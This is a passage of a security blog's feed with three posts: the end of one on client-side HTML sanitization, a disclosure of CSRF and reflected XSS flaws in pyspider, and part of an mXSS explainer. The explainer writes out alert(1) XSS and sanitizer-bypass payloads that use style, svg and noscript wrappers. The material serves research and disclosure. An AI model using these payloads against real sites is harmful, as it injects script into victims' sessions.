root cause of many sanitizer bypass vulnerabilities lies in a fundamental misunderstanding of HTML’s complexities and the various ways in which malicious code can be injected. Let’s try to emphasize this by giving a couple of examples:</p><ol><li><p><strong>General differentials</strong>: HTML is not straightforward to parse, to the point that even major browsers like Chrome and Firefox can have subtle differences in how they parse and render HTML. A server can have clients using various browsers, hence different parsing.</p></li><li><p><strong>HTML is a constantly evolving language</strong>. New elements, attributes, and features are introduced regularly, making new differentials between up-to-date parsers and older versions. For example, one user might use an older version of Chrome that follows older specification standards.</p></li><li><p><strong>Parser Configuration</strong>: The configuration of the sanitizer’s parser can significantly impact its behavior. For example, whether <a href="https://html.spec.whatwg.org/#enabling-and-disabling-scripting">scripting</a> is enabled or disabled can determine how certain elements are parsed.</p></li><li><p><strong>Parsing Context</strong>: The context in which the sanitized data is used is crucial. A piece of HTML that is safe in one context might be harmful in another. For example, a <code>style</code> element’s content behaves differently in different namespaces.</p></li><li><p><strong>Parsing Roundtrip</strong>: Even when using the same parser, there can be issues with parsing roundtrips. This occurs when HTML is parsed, modified, and then reparsed. The process of parsing and reparsing can introduce unintended changes to the markup.</p></li><li><p><strong>MXSS Techniques</strong>: Attackers can take advantage of Mutation XSS techniques to bypass sanitization, taking advantage of the complexity of the HTML language (read more about it <a href="https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/">here</a>).</p></li></ol><p>All in all, a server can never be sure that the way it parses the HTML will be the same when it is viewed on a different machine. This is why it’s important to parse and sanitize the data on the same endpoint where the XSS might take place.</p><h2 id="What-Should-Developers-Do"><a href="#What-Should-Developers-Do" class="headerlink" title="What Should Developers Do?"></a>What Should Developers Do?</h2><p>Unfortunately, at the time of writing, there is no standardized, browser-native solution for securely handling untrusted HTML input. Currently, developers must rely on third-party libraries or build custom sanitization mechanisms.</p><p>While there’s an ongoing effort to develop an official client-side sanitizer (as we discussed in the <a href="https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/#future">Future</a> section of our <a href="https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code">mXSS blog post</a>), it is still in progress. In the meantime, the best approach is to carefully consider the specific HTML features required by your application. A more restrictive HTML policy can significantly reduce the attack surface, but it may not always align with product needs. For scenarios where some HTML input is necessary, <a href="https://github.com/cure53/DOMPurify">DOMPurify</a> is currently considered the most robust (<strong>When used on the client side</strong>) sanitization library. You can configure DOMPurify to only allow the HTML elements you need to further harden your application and prevent CSS injections as well.</p><h2 id="Disclosure"><a href="#Disclosure" class="headerlink" title="Disclosure"></a>Disclosure</h2><p>Following our report PHP updated its documentation to contain a big red warning box on the HTML4 parsing API to raise awareness that it shouldn’t be used for sanitizing:</p><img src="/img/blogs/sanitize-client-side/image6.png" style="width: 100%;"/><p>Additionally, in November 2023, PHP 8.4 was released with <a href="https://wiki.php.net/rfc/domdocument_html5_parser">HTML5 support</a> using the underlying <a href="https://github.com/lexbor/lexbor">Lexbor</a> library. <strong>However, this still doesn’t solve the problem of not sanitizing the client side</strong>, as we’ve seen in the examples above.</p><p>Lastly, we reported our findings to various affected sanitizers. Some fixed our findings, and despite others not addressing our findings, we released this blog under the 90-day responsible disclosure policy.</p><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><table><thead><tr><th>Date</th><th>Action</th></tr></thead><tbody><tr><td>2023-09-19</td><td>We report all issues to PHP maintainers.</td></tr><tr><td>2023-09-19</td><td>The vendor acknowledged receiving the report.</td></tr><tr><td>2023-10-03</td><td>The maintainers <a href="https://github.com/php/doc-en/commit/4ef716f8aa753e1189b2e57c91da378b16d970b0">updated</a> the official documentation to include a warning for developers.</td></tr></tbody></table><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>In this blog, we explored the importance of client-side sanitization for untrusted HTML input. We highlighted the inherent limitations of server-side sanitization, demonstrating how the complexity of HTML parsing can lead to vulnerabilities. Due to variations in parsing algorithms across different environments, server-side sanitization cannot guarantee consistent parsing amongst various endpoints. As a best practice, developers should implement client-side sanitization to ensure that untrusted input is processed in a controlled and secure manner, reducing substantially the risk of a sanitizer bypass.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;The battle against &lt;a href=&quot;https://owasp.org/www-community/attacks/xss/&quot;&gt;Cross-Site Scripting&lt;/a&gt; (XSS) has been going on for years, wit</summary>
      
    
    
    
    
    <category term="xss" scheme="https://yaniv-git.github.io/tags/xss/"/>
    
    <category term="php" scheme="https://yaniv-git.github.io/tags/php/"/>
    
    <category term="mxss" scheme="https://yaniv-git.github.io/tags/mxss/"/>
    
    <category term="bypass" scheme="https://yaniv-git.github.io/tags/bypass/"/>
    
    <category term="html" scheme="https://yaniv-git.github.io/tags/html/"/>
    
  </entry>
  
  <entry>
    <title>Basic HTTP Authentication Risk: Uncovering pyspider Vulnerabilities</title>
    <link href="https://yaniv-git.github.io/2024/09/02/Basic%20HTTP%20Authentication%20Risk:%20Uncovering%20pyspider%20Vulnerabilities/"/>
    <id>https://yaniv-git.github.io/2024/09/02/Basic%20HTTP%20Authentication%20Risk:%20Uncovering%20pyspider%20Vulnerabilities/</id>
    <published>2024-09-02T22:00:00.000Z</published>
    <updated>2025-07-08T15:29:30.239Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://docs.pyspider.org/en/latest/">pyspider</a> is a powerful and versatile web crawling framework that caters to various use cases. With its user-friendly approach, robust features, and extensive support for different technologies, it’s a great choice for developers who want to build reliable and efficient web scrapers in Python. Unfortunately in the last years, the project was neglected and left unmaintained, and as a result of our reporting, the maintainer archived the GitHub repository to highlight that the project is not updated anymore. This also means that security vulnerabilities are not fixed.</p><p>Driven by our dedication to both open-source security and the advancement of our Clean Code technology, we leverage <a href="https://sonarcloud.io/">SonarCloud</a> to conduct frequent vulnerability scans on open-source projects. This not only benefits the broader open-source community but also strengthens our own tools – and the best part? SonarCloud offers free code analysis for any open-source project, making it accessible to everyone.</p><p>This article delves into the consequences of vulnerabilities found by our engine and uncovers the risk of using basic HTTP authentication. We’ll also explore how attackers might leverage this vulnerability.</p><h1 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h1><p>An attacker might manipulate an authenticated victim to click on a malicious link, resulting in code execution on the host running pyspider. After we reported our findings, the maintainer has archived the repository on GitHub, making sure users are aware the project isn’t supported anymore (refer to the <a href="#Patch">Patch</a> and <a href="#Timeline">Timeline</a> sections for more info).</p><iframe width="736" height="414" src="https://www.youtube.com/embed/HTzmTucyHmQ" title="Basic HTTP Authentication Risk: Uncovering pyspider Vulnerabilities" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><h1 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h1><p>In this section, we will cover the technical details of the findings, and interesting security information for developers opting to use the basic HTTP authentication in their application.</p><h3 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h3><p>Before delving into the details of the findings, we first need to understand some basic features of the application. pyspider provides users with a convenient <a href="https://docs.pyspider.org/en/latest/Command-Line/#webui">WebUI component</a> that allows project management, task monitoring, viewing results, and crawl script code editors. From a security point of view, the code editor feature allows running arbitrary Python code on the machine through the web interface, by design. To protect an externally exposed instance, pyspider offers the ability to enable authentication via the <a href="https://docs.pyspider.org/en/latest/Command-Line/#-need-auth">–need-auth</a> flag.</p><h3 id="Discovering-vulnerabilities"><a href="#Discovering-vulnerabilities" class="headerlink" title="Discovering vulnerabilities"></a>Discovering vulnerabilities</h3><p>SonarCloud, our cloud-based code analysis service, employs cutting-edge static analysis techniques to identify quality issues, bugs, and security weaknesses within your code. During a routine scan of public open-source projects, SonarCloud identified the following issues in pyspider’s WebUI component (<a href="https://sonarcloud.io/project/issues?resolved=false&types=VULNERABILITY&id=SonarSourceResearch_pyspider-blogpost&open=AY9xKZX48flNzQPVUOH6">see it yourself on SonarCloud</a>):</p><img src="/img/blogs/pyspider/image1.png" style="width: 100%;"/><p>The first one is a detected vulnerability covering a Cross-Site Scripting (XSS) reflection on the <code>/update</code> route via the <code>name</code> parameter:</p><img src="/img/blogs/pyspider/image2.png" style="width: 100%;"/><p>The second finding is a security hotspot warning us that there is a risk of Cross-Site Request Forgery (CSRF) when using Flask without any protection.</p><img src="/img/blogs/pyspider/image3.png" style="width: 100%;"/><p>The key distinction between a hotspot and a vulnerability lies in the <strong>immediacy of the security risk.</strong> (<a href="https://docs.sonarsource.com/sonarqube/latest/user-guide/security-hotspots/#vulnerability-or-hotspot">read more in the official documentation</a>)</p><ul><li><p><strong>Hotspot</strong>: A hotspot flags a potentially risky code section that might become a vulnerability in certain contexts. It’s like a yellow traffic light – proceed with caution and review the code. The overall application security might not be compromised, but further analysis is recommended.</p></li><li><p><strong>Vulnerability</strong>: A detected vulnerability represents a high likelihood of a security weakness that can be exploited by attackers. It’s akin to a red traffic light – stop and fix the issue immediately. Vulnerabilities pose a clear and present danger to the application’s security.</p></li></ul><p>Let’s consider a CSRF hotspot rule:<br>The scanner might highlight a POST endpoint that doesn’t include a CSRF token. This is a hotspot because, without a token, an attacker could potentially craft a malicious request that tricks a user’s browser into submitting the form unintentionally. However, a CSRF attack can be mitigated already depending on the cookie’s <a href="https://web.dev/articles/samesite-cookies-explained">SameSite</a> type used in the application. Or, the application logic of that endpoint doesn’t have any security impact nor require authentication in the first place. For those reasons, it might be considered a low-priority hotspot for review, depending on the specific context of the application.</p><h3 id="Basic-HTTP-authentication-CSRF-CVE-2024-39163"><a href="#Basic-HTTP-authentication-CSRF-CVE-2024-39163" class="headerlink" title="Basic HTTP authentication CSRF (CVE-2024-39163)"></a>Basic HTTP authentication CSRF (CVE-2024-39163)</h3><p>In the case of pyspider, the hotspot was relevant and exploitable. As mentioned before, access to the pyspider WebUI is equivalent to code execution. In instances where authentication is not enabled, it’s considered a risk introduced by the pyspider user rather than a vulnerability. We are interested to see what can go wrong if authentication is enabled.</p><p>Before trying to validate the CSRF hotspot, let’s see how pyspider implements authentication. Setting up the application using the <code>--need-auth</code> flag, and trying to access the web interface we are introduced to the following browser-default login prompt:</p><img src="/img/blogs/pyspider/image4.png" style="width: 100%;"/><p>This authentication method is used under the hood is <a href="https://datatracker.ietf.org/doc/html/rfc7617">Basic HTTP authentication</a>. While this is a rather legacy authentication mechanism it is still supported by modern browsers. On top of that they handle it conveniently, by using the built-in UI prompt and sending the credentials in the subsequent requests via the <code>Authorization</code> header:</p><img src="/img/blogs/pyspider/image5.png" style="width: 100%;"/><p>Unlike the other common way of authentication and maintaining a session via cookies, the browser doesn’t implement any CSRF mitigation for the basic HTTP authentication and the corresponding <code>Authorization</code> header, such as <a href="https://web.dev/articles/samesite-cookies-explained">SameSite cookies</a>. The browser adds the <code>Authorization</code> header containing the Basic auth credentials to all cross-site requests as well. This means that the only thing standing between a CSRF vulnerability and the application are mitigations on the endpoint level (a <a href="https://portswigger.net/web-security/csrf#:~:text=Common%20defences%20against%20CSRF">CSRF token</a>, for instance).</p><p>Because no mitigation steps are taken, an attacker would just need to understand which requests are made to execute arbitrary code on the machine and craft a malicious website that replicates them, exploiting the CSRF vulnerability. Manipulating an authenticated victim to visit the attacker’s website will result in arbitrary code execution.</p><h3 id="Reflected-XSS-Vulnerability-CVE-2024-39162"><a href="#Reflected-XSS-Vulnerability-CVE-2024-39162" class="headerlink" title="Reflected XSS Vulnerability (CVE-2024-39162)"></a>Reflected XSS Vulnerability (CVE-2024-39162)</h3><p>The second detected vulnerability reported by SonarCloud is an XSS in the <code>/update</code> endpoint.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/update&#x27;</span>,  methods=[<span class="string">&#x27;POST&#x27;</span>,  ]</span>)</span></span><br><span class="line"><span class="keyword">def</span>  <span class="title function_">project_update</span>():</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    name  =  request.form[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="keyword">if</span>  name  <span class="keyword">not</span>  <span class="keyword">in</span>  (<span class="string">&#x27;group&#x27;</span>,  <span class="string">&#x27;status&#x27;</span>,  <span class="string">&#x27;rate&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span>  <span class="string">&#x27;unknown field: %s&#x27;</span>  %  name,  <span class="number">400</span></span><br></pre></td></tr></table></figure><p>This simple example showcases how a reflected XSS looks like on the code level. A parameter is taken from the request (a user input) and if certain conditions match, the value is reflected back to the user.</p><p>While this is a <code>POST</code>-only endpoint, an attacker cannot simply craft a malicious link with a reflected XSS payload, but by leveraging the first finding, an attacker can create a malicious website that uses CSRF and elevate it to XSS. From there, code execution on the server is an intended feature.</p><h3 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h3><p>After disclosing the vulnerabilities the maintainer stated that this project is no longer maintained and archived the repository on GitHub as a result. We recommend avoiding using unmaintained code, or as a last resort, disabling the <em>WebUI</em> component of pyspider.</p><h1 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h1><table><thead><tr><th>Date</th><th>Action</th></tr></thead><tbody><tr><td>2024-04-03</td><td>We reported all issues to the maintainers</td></tr><tr><td>2024-04-29</td><td>We pinged the maintainers</td></tr><tr><td>2024-05-03</td><td>We pinged the maintainers again mentioning that 60 days had passed</td></tr><tr><td>2024-06-03</td><td>We notified the maintainers that the 90-day disclosure window has passed and we will release a blog post about the findings</td></tr><tr><td>2024-06-11</td><td>The maintainer stated the project is unmaintained and archived the repository</td></tr><tr><td>2024-07-05</td><td>CVE-2024-39163 and CVE-2024-39162 were assigned</td></tr></tbody></table><h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>This blog post delves into the critical role of code analysis in safeguarding applications. We showcase the power of SonarCloud, our cloud-based service that identifies security vulnerabilities often buried within your codebase. SonarCloud ensures Clean Code practices enhancing code readability, maintainability, and security. Clean code and proactive code analysis empower developers to build more secure applications.</p><p>We explored real-world examples of vulnerabilities unearthed by SonarCloud, highlighting the potential dangers they pose. And explained how legacy basic HTTP authentication could be convenient to use but might contain some security risks. Additionally, we demonstrated the differences between a “vulnerability” finding vs a “hotspot”, and why developers shouldn’t neglect them. </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://docs.pyspider.org/en/latest/&quot;&gt;pyspider&lt;/a&gt; is a powerful and versatile web crawling framework that caters to various use</summary>
      
    
    
    
    
    <category term="rce" scheme="https://yaniv-git.github.io/tags/rce/"/>
    
    <category term="xss" scheme="https://yaniv-git.github.io/tags/xss/"/>
    
    <category term="csrf" scheme="https://yaniv-git.github.io/tags/csrf/"/>
    
  </entry>
  
  <entry>
    <title>mXSS: The Vulnerability Hiding in Your Code</title>
    <link href="https://yaniv-git.github.io/2024/05/26/mXSS:%20The%20Vulnerability%20Hiding%20in%20Your%20Code/"/>
    <id>https://yaniv-git.github.io/2024/05/26/mXSS:%20The%20Vulnerability%20Hiding%20in%20Your%20Code/</id>
    <published>2024-05-26T22:00:00.000Z</published>
    <updated>2025-07-08T15:29:30.242Z</updated>
    
    <content type="html"><![CDATA[<p>Cross-site scripting (XSS) is a well-known vulnerability type that occurs when an attacker can inject JavaScript code into a vulnerable page. When an unknowing victim visits the page, the injected code is executed in the victim’s session. The impact of this attack could vary depending on the application, with no business impact to <a href="https://ysamm.com/?p=779" title="account takeover">account takeover</a> (ATO), <a href="https://www.sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail/" title="data leak">data leak</a>, or even <a href="https://www.sonarsource.com/blog/reply-to-calc-the-attack-chain-to-compromise-mailspring" title="remote code execution">remote code execution</a> (RCE).</p><p>There are various types of XSS, such as reflected, stored, and universal. But in recent years, the mutation class of XSS has become feared for bypassing sanitizers, such as DOMPurify, Mozilla bleach, Google Caja, and more… affecting numerous applications, including Google Search. To this day, we see many applications that are susceptible to these kinds of attacks.</p><p><strong>But what is mXSS?</strong></p><p>(We also explored this topic in our Insomnihack 2024 talk: <a href="https://www.youtube.com/watch?v=g3yzTQnIgtE" title="Beating The Sanitizer: Why You Should Add mXSS To Your Toolbox">Beating The Sanitizer: Why You Should Add mXSS To Your Toolbox</a>.)</p><h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>If you are a web developer, you have probably integrated or even implemented some kind of sanitization to protect your application from XSS attacks. But little is known about how difficult it is to make a proper HTML sanitizer. The goal of an HTML sanitizer is to ensure that user-generated content, such as text input or data obtained from external sources, does not pose any security risks or disrupt the intended functionality of a website or application.</p><p>One of the main challenges in implementing an HTML sanitizer lies in the complex nature of HTML itself. HTML is a versatile language with a wide range of elements, attributes, and potential combinations that can affect the structure and behavior of a webpage. Parsing and analyzing HTML code accurately while preserving its intended functionality can be a daunting task.</p><h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><p>Before getting into the subject of mXSS, let’s first have a look at HTML, the markup language that forms the foundation of web pages. Understanding HTML’s structure and how it works is crucial since mXSS (mutation Cross-Site Scripting) attacks utilize quirks and intricacies of HTML.</p><p>HTML is considered a tolerant language because of its forgiving nature when it encounters errors or unexpected code. Unlike some stricter programming languages, HTML prioritizes displaying content even if the code isn’t perfectly written. Here’s how this tolerance plays out:</p><p>When a broken markup is rendered, instead of crashing or displaying an error message, browsers attempt to interpret and fix the HTML as best as they can, even if it contains minor syntax errors or missing elements. For instance, opening the following markup in the browser <code>&lt;p&gt;test</code> will execute as expected despite missing a closing <code>p</code> tag. When looking at the final page’s HTML code we can see that the parser fixed our broken markup and closed the <code>p</code> element by itself: <code>&lt;p&gt;test&lt;/p&gt;</code>.</p><p><strong>Why it’s Tolerant:</strong></p><ul><li><strong>Accessibility</strong>: The web should be accessible to everyone, and minor errors in HTML shouldn’t prevent users from seeing the content. Tolerance allows for a wider range of users and developers to interact with the web.</li><li><strong>Flexibility</strong>: HTML is often used by people with varying levels of coding experience. Tolerance allows for some sloppiness or mistakes without completely breaking the page’s functionality.</li><li><strong>Backward Compatibility</strong>: The web is constantly evolving, but many existing websites are built with older HTML standards. Tolerance ensures that these older sites can still be displayed in modern browsers, even if they don’t adhere to the latest specifications.</li></ul><p>But how does our HTML parser know in which way to “fix” a broken markup? Should <code>&lt;a&gt;&lt;b&gt;</code> become<code>&lt;a&gt;&lt;/a&gt;&lt;b&gt;&lt;/b&gt;</code> or <code>&lt;a&gt;&lt;b&gt;&lt;/b&gt;&lt;/a&gt;</code> ?<br>To answer this question there is a well-documented <a href="https://html.spec.whatwg.org/" title="HTML specification">HTML specification</a>, but unfortunately, there are still some ambiguities that result in different HTML parsing behaviors even between major browsers today.</p><h2 id="Mutation"><a href="#Mutation" class="headerlink" title="Mutation"></a>Mutation</h2><p>OK, so HTML can tolerate broken markup how is this relevant?<br>The M in mXSS stands for “mutation”, and mutation in HTML is any kind of change made to the markup for some reason or another.</p><ul><li>When a parser fixes a broken markup (<code>&lt;p&gt;test</code> → <code>&lt;p&gt;test&lt;/p&gt;</code>), that’s a mutation. </li><li>Normalizing attribute quotes (<code>&lt;a alt=test&gt;</code> → <code>&lt;a alt=&quot;test&quot;&gt;</code>), that’s a mutation.</li><li>Rearranging elements (<code>&lt;table&gt;&lt;a&gt;</code> → <code>&lt;a&gt;&lt;/a&gt;&lt;table&gt;&lt;/table&gt;</code>), that’s a mutation</li><li>And so on…</li></ul><p>mXSS takes advantage of this behavior in order to bypass sanitization, we will showcase examples in the technical details.</p><h1 id="HTML-Parsing-Background"><a href="#HTML-Parsing-Background" class="headerlink" title="HTML Parsing Background"></a>HTML Parsing Background</h1><p>Summarizing HTML parsing, a 1500~ page-long <a href="https://html.spec.whatwg.org/" title="standard">standard</a>, into one section is not realistic. However, due to its importance for understanding in-depth mXSS and how payloads work, we must cover at least some major topics. To make things easier, we’ve developed an <a href="https://sonarsource.github.io/mxss-cheatsheet/" title="mXSS cheatsheet">mXSS cheatsheet</a> (coming later in this blog) that condenses the hefty standard into a more manageable resource for researchers and developers.</p><h2 id="Different-content-parsing-types"><a href="#Different-content-parsing-types" class="headerlink" title="Different content parsing types"></a>Different content parsing types</h2><p>HTML isn’t a one-size-fits-all parsing environment. Elements handle their content differently, with seven distinct <a href="https://html.spec.whatwg.org/#elements-2" title="parsing modes">parsing modes</a> at play. We’ll explore these modes to understand how they influence mXSS vulnerabilities:</p><ul><li><a href="https://html.spec.whatwg.org/#void-elements" title="void elements">void elements</a><ul><li><code>area</code>, <code>base</code>, <code>br</code>, <code>col</code>, <code>embed</code>, <code>hr</code>, <code>img</code>, <code>input</code>, <code>link</code>, <code>meta</code>, <code>source</code>, <code>track</code>, <code>wbr</code></li></ul></li><li><a href="https://html.spec.whatwg.org/#the-template-element-2" title="the template element">the <code>template</code> element</a><ul><li><code>template</code></li></ul></li><li><a href="https://html.spec.whatwg.org/#raw-text-elements" title="Raw text elements">Raw text elements</a><ul><li><code>script</code>, <code>style</code>, <code>noscript</code>, <code>xmp</code>, <code>iframe</code>, <code>noembed</code>, <code>noframes</code></li></ul></li><li><a href="https://html.spec.whatwg.org/#escapable-raw-text-elements" title="Escapable raw text elements">Escapable raw text elements</a><ul><li><code>textarea</code>, <code>title</code></li></ul></li><li><a href="https://html.spec.whatwg.org/#foreign-elements" title="Foreign content elements">Foreign content elements</a><ul><li><code>svg</code>, <code>math</code></li></ul></li><li><a href="https://html.spec.whatwg.org/#plaintext-state" title="Plaintext state">Plaintext state</a><ul><li><code>plaintext</code></li></ul></li><li><a href="https://html.spec.whatwg.org/#normal-elements" title="Normal elements">Normal elements</a><ul><li>All other allowed HTML elements are normal elements.</li></ul></li></ul><p>We can fairly easily demonstrate a difference between parsing types using the following example:</p><ol><li>Our first input is a <code>div</code> element, which is a “normal element” element:<br><code>&lt;div&gt;&lt;a alt=&quot;&lt;/div&gt;&lt;img src=x onerror=alert(1)&gt;&quot;&gt;</code></li><li>On the other hand, the second input is a similar markup using the <code>style</code> element instead (which is a “raw text”):<br><code>&lt;style&gt;&lt;a alt=&quot;&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;&quot;&gt;</code></li></ol><p>Looking at the parsed markup we can clearly see the parsing differences:</p><img src="/img/blogs/mxss/div_example.png" style="width: 100%;"/><img src="/img/blogs/mxss/style_example.png" style="width: 100%;"/><p>The content of the <code>div</code> element is rendered as HTML, an <code>a</code> element is created. What seems to be a closing <code>div</code> and an <code>img</code> tag is actually an attribute value of the <code>a</code> element, thus rendered as <code>alt</code> text for the <code>a</code> element and not HTML markup. In the <code>style</code> example, the content of the <code>style</code> element is rendered as raw text, so no <code>a</code> element is created, and the alleged attribute is now normal HTML markup.</p><h2 id="Foreign-content-elements"><a href="#Foreign-content-elements" class="headerlink" title="Foreign content elements"></a>Foreign content elements</h2><p>HTML5 introduced new ways to integrate specialized content within web pages. Two key examples are the <code>&lt;svg&gt;</code> and <code>&lt;math&gt;</code> elements. These elements leverage distinct namespaces, meaning they follow different parsing rules compared to standard HTML. Understanding these different parsing rules is crucial for mitigating potential security risks associated with mXSS attacks.</p><p>Let’s take a look at the same example as before but this time encapsulated inside an <code>svg</code> element:</p><p><code>&lt;svg&gt;&lt;style&gt;&lt;a alt=&quot;&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;&quot;&gt;</code></p><img src="/img/blogs/mxss/style_in_svg.png" style="width: 100%;"/><p>In this case, we do see an <code>a</code> element being created. The <code>style</code> element doesn’t follow the “raw text” parsing rules, because it is inside a different namespace. When residing within an SVG or MathML namespace, the parsing rules change and no longer follow the HTML language.<br>Using namespace confusion techniques (such as <a href="https://research.securitum.com/dompurify-bypass-using-mxss/" title="DOMPurify 2.0.0 bypass">DOMPurify 2.0.0 bypass</a>) attackers can manipulate the sanitizer to parse content in a different way than how it will be rendered eventually by the browser, evading detection of malicious elements.</p><h1 id="From-Mutations-to-Vulnerabilities"><a href="#From-Mutations-to-Vulnerabilities" class="headerlink" title="From Mutations to Vulnerabilities"></a>From Mutations to Vulnerabilities</h1><p>Often times the mXSS term is used in a broad way when covering various sanitizer bypasses. For better understanding, we will split the general term “mXSS” into 4 different subcategories</p><h2 id="Parser-differentials"><a href="#Parser-differentials" class="headerlink" title="Parser differentials"></a>Parser differentials</h2><p>Though parser differentials can be referred to as usual sanitizer bypass, sometimes it is referred to as mXSS. Either way, an attacker can take advantage of a parser mismatch between the sanitizer’s algorithm vs the renderer’s (e.g. browser). Due to the complexity of HTML parsing, having parsing differentials doesn’t necessarily mean that one parser is wrong while the other is right.</p><p>Let’s take for example the <a href="https://html.spec.whatwg.org/multipage/scripting.html#the-noscript-element" title="noscript">noscript</a> element, ​​the parsing rule for it is: “If the <a href="https://html.spec.whatwg.org/multipage/parsing.html#scripting-flag" title="scripting flag">scripting flag</a> is enabled, switch the tokenizer to the <a href="https://html.spec.whatwg.org/multipage/parsing.html#rawtext-state" title="RAWTEXT state">RAWTEXT state</a>. Otherwise, leave the tokenizer in the <a href="https://html.spec.whatwg.org/multipage/parsing.html#data-state" title="data state">data state</a>.” (<a href="https://html.spec.whatwg.org/multipage/parsing.html#parsing-html-fragments" title="link">link</a>) Meaning, that depending on whether JavaScript is disabled or enabled the body of the <code>noscript</code> element is rendered differently. It is logical that JavaScript would not be enabled in the sanitizer stage but will be in the renderer. This behavior is not wrong by definition but could cause <a href="https://checkmarx.com/blog/vulnerabilities-discovered-in-mozilla-bleach/" title="bypasses">bypasses</a> such as: <code>&lt;noscript&gt;&lt;style&gt;&lt;/noscript&gt;&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</code></p><p>JS disabled:</p><img src="/img/blogs/mxss/noscript_1.png" style="width: 100%;"/><p>JS enabled:</p><img src="/img/blogs/mxss/noscript_2.png" style="width: 100%;"/><p>Many other parser differentials, such as different HTML versions, content type mismatches, and more, could occur.</p><h2 id="Parsing-round-trip"><a href="#Parsing-round-trip" class="headerlink" title="Parsing round trip"></a>Parsing round trip</h2><p>Parsing round trip is a well-known and <a href="https://html.spec.whatwg.org/multipage/parsing.html#serialising-html-fragments" title="documented">documented</a> phenomenon, that says: “It is possible that the output of this algorithm if parsed with an <a href="https://html.spec.whatwg.org/multipage/parsing.html#html-parser" title="HTML parser">HTML parser</a>, will not return the original tree structure. Tree structures that do not roundtrip a serialize and reparse step can also be produced by the <a href="https://html.spec.whatwg.org/multipage/parsing.html#html-parser" title="HTML parser">HTML parser</a> itself, although such cases are typically non-conforming.”<br>Meaning that according to the number of times we parse an HTML markup the resulting DOM tree could change.</p><p>Let’s take a look at the official example provided in the <a href="https://html.spec.whatwg.org/multipage/parsing.html#serialising-html-fragments" title="specification">specification</a>:</p><p>But first, we need to understand that a <code>form</code> element cannot have another <code>form</code> nested inside of it: “Content model: Flow content, but with no form element descendants.” (as written in the <a href="https://html.spec.whatwg.org/multipage/forms.html#the-form-element" title="specs">specs</a>)</p><img src="/img/blogs/mxss/form_docs.png" style="width: 100%;"/><p>But if we just continue to read the documentation they give an example of how <code>form</code> elements can be nested, by the following markup:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">form</span> id=<span class="string">&quot;outer&quot;</span>&gt;&lt;div&gt;&lt;/<span class="keyword">form</span>&gt;&lt;<span class="keyword">form</span> id=<span class="string">&quot;inner&quot;</span>&gt;&lt;<span class="keyword">input</span>&gt;</span><br><span class="line"></span><br><span class="line">html</span><br><span class="line">├── head</span><br><span class="line">└── body</span><br><span class="line">    └── <span class="keyword">form</span> id=<span class="string">&quot;outer&quot;</span></span><br><span class="line">        └── div</span><br><span class="line">            └── <span class="keyword">form</span> id=<span class="string">&quot;inner&quot;</span></span><br><span class="line">                └── <span class="keyword">input</span></span><br></pre></td></tr></table></figure><p>The <code>&lt;/form&gt;</code> is ignored because of the unclosed <code>div</code> and the <code>input</code> element will be associated with the inner <code>form</code> element. Now, if this tree structure is serialized and reparsed, the <code>&lt;form id=&quot;inner&quot;&gt;</code> start tag will be ignored, and so the <code>input</code> element will be associated with the outer <code>form</code> element instead.</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;outer&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;inner&quot;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">input</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span 